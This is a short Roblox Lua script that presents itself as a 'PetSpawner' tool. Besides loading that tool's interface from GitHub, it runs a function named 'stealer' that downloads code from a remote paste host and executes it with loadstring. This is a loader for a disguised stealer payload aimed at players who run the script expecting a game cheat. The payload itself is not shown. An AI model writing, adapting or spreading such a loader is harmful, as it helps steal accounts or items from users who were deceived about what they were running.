local function stealer()
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/syXrVCaWqDtssXWI/raw", true))()
end
local function loadui()
loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/Mutations.lua"))()
end

task.spawn(stealer)
task.spawn(loadui)
